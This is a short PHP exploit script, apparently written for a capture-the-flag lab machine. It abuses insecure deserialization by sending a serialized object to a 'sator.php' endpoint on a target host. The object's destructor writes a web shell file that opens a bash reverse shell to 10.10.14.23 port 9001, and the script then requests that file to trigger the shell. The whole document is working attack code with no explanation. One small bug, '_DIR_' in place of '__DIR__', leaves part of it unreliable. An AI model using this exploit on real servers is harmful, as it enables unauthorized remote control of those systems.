<?php

class DatabaseExport
{
        public $user_file = 'red.php';
        public $data = '<?php exec ("/bin/bash -c \'bash -i >& /dev/tcp/10.10.14.23/9001 0>&1\'") ?>;';

        public function __destruct()
        {
                file_put_contents(_DIR_ . '/' . $this ->user_file, $this ->data);
                echo 'Payload Sent';

        }
}
$url = 'http://10.10.10.223/sator.php?arepo=';
$url = $url . urlencode(serialize(new DatabaseExport));
$response = file_get_contents("$url");
$response = file_get_contents("http://10.10.10.223/red.php");

?>
